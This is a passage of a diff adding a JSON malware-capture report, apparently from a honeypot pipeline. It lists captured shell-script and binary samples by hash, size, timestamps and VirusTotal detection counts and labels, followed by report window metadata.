+      "vt_completed_at": "2026-09-09T13:05:35.867+00:00",
+      "vt_threat_label": "trojan.shell/bashdlod",
+      "vt_meaningful_name": "2779ac942a1c5d8f07f6eec7d4707d1bf2583760029573da7fd23210084fa405.raw",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "0e66efe7d27840b18b51f9559147d9d6",
+      "sha1": "8ad5d545ca6609c9e4f967bd02300ecdafe38b0b",
+      "sha256": "e7061379de0d12588c9d833b912a05e3835c9dc630902c8d10b460ec972f0298",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-09T04:10:21.854802+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-09T04:10:21.854802+00:00",
+      "size_bytes": 1444,
+      "artifact_id": "9e6479e6-5bbd-4d7b-af67-76f8d45b0f3e",
+      "vt_harmless": 0,
+      "vt_file_type": "Shell script",
+      "vt_malicious": 28,
+      "vt_reputation": 0,
+      "vt_suspicious": 0,
+      "vt_undetected": 32,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.867+00:00",
+      "vt_threat_label": "trojan.bashdlod/gen2",
+      "vt_meaningful_name": "e7061379de0d12588c9d833b912a05e3835c9dc630902c8d10b460ec972f0298.unknown",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "224b41af1717915304b30540473b8db2",
+      "sha1": "90d8371f9dcf69d9823549efb2de0cec384b7d98",
+      "sha256": "1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-08T13:39:47.728039+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-08T13:39:47.728039+00:00",
+      "size_bytes": 2126,
+      "artifact_id": "3fc06f07-6a6f-4baa-b3a1-483aaef0efe6",
+      "vt_harmless": 0,
+      "vt_file_type": "Shell script",
+      "vt_malicious": 27,
+      "vt_reputation": -1,
+      "vt_suspicious": 0,
+      "vt_undetected": 32,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.866+00:00",
+      "vt_threat_label": "trojan.sagent/shell",
+      "vt_meaningful_name": "1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d.sh",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "10b95d1594f17d21ac233990ea777c6d",
+      "sha1": "ac3b1018c90f8271dccb2afc7c86ac206db9d9f8",
+      "sha256": "2d41372a3ee70895ee6be05e3a94d460dc9a2feb61b9fb907f3155e0c120c992",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-09T04:10:22.071811+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-09T04:10:22.071811+00:00",
+      "size_bytes": 1519,
+      "artifact_id": "41cdb414-018b-4669-8866-88f83c48d02c",
+      "vt_harmless": 0,
+      "vt_file_type": "Shell script",
+      "vt_malicious": 23,
+      "vt_reputation": 0,
+      "vt_suspicious": 0,
+      "vt_undetected": 36,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.867+00:00",
+      "vt_threat_label": "downloader.shell/bashdlod",
+      "vt_meaningful_name": "lns8vg.exe",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "87c17de32d7e5b8e1de0e6e18adcd572",
+      "sha1": "6324f0ef6f0de1d22696747d383068e412be9f80",
+      "sha256": "e3ac3cffebd0089e011b524e399f02cfe444d55a57c3f1b13cf1676baf87eb32",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-08T16:24:08.621964+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-08T16:24:08.621964+00:00",
+      "size_bytes": 1608,
+      "artifact_id": "d9fe80e6-662e-4639-8cc9-306818dbbd69",
+      "vt_harmless": 0,
+      "vt_file_type": "Shell script",
+      "vt_malicious": 20,
+      "vt_reputation": 0,
+      "vt_suspicious": 0,
+      "vt_undetected": 38,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.866+00:00",
+      "vt_threat_label": "downloader.bashdlod/gen2",
+      "vt_meaningful_name": null,
+      "vt_response_status": 200
+    },
+    {
+      "md5": "2ca1a863f6a115127d623d3d181ab9b4",
+      "sha1": "58c15d76520685b6c151cd48b09375bb94b825be",
+      "sha256": "3f3a11bafabb1a35db913cfe51995f2e357d049e268860175876ae5a93d23892",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-08T13:38:56.703694+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-08T13:38:56.703694+00:00",
+      "size_bytes": 1157,
+      "artifact_id": "253106b0-4994-4f83-8c62-5067a0b55ad3",
+      "vt_harmless": 0,
+      "vt_file_type": "Shell script",
+      "vt_malicious": 20,
+      "vt_reputation": -1,
+      "vt_suspicious": 0,
+      "vt_undetected": 40,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.866+00:00",
+      "vt_threat_label": "trojan.qwexlafiba/shell",
+      "vt_meaningful_name": "20260905-055928_sftp__root_clean_sh",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "1c8c10167970b4447ebb46a2d977f61a",
+      "sha1": "3576edcfa524213c02cdbe1a9816f4feabc83349",
+      "sha256": "26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-08T19:51:22.342702+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-08T19:51:22.342702+00:00",
+      "size_bytes": 46720,
+      "artifact_id": "5185dc43-8e59-4aa9-8a9b-2dcf9f13a0fd",
+      "vt_harmless": 0,
+      "vt_file_type": "unknown",
+      "vt_malicious": 14,
+      "vt_reputation": -44,
+      "vt_suspicious": 0,
+      "vt_undetected": 48,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.867+00:00",
+      "vt_threat_label": "trojan.sagnt",
+      "vt_meaningful_name": "endat",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "8a9b94910275355998db5994fd3e579a",
+      "sha1": "8363b964b5293404c985febbd48c0e55f203f5ae",
+      "sha256": "a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-09T06:49:25.744123+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-07T04:34:47.226087+00:00",
+      "size_bytes": 334816,
+      "artifact_id": "6ffe33b5-7170-474c-92ee-ab347c7e1a45",
+      "vt_harmless": 0,
+      "vt_file_type": "unknown",
+      "vt_malicious": 2,
+      "vt_reputation": -43,
+      "vt_suspicious": 0,
+      "vt_undetected": 57,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.867+00:00",
+      "vt_threat_label": "trojan.damagedfile",
+      "vt_meaningful_name": "a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437.raw",
+      "vt_response_status": 200
+    }
+  ],
+  "window_end": "2026-09-09T13:15:05.025Z",
+  "report_date": "2026-09-09",
+  "generated_at": "2026-09-09T13:15:05.052Z",
+  "window_start": "2026-09-08T13:15:05.025Z",
+  "security_onion": {
+    "status": "planned",
+    "integrated": false
+  },
+  "report_schema_version": 2
+}
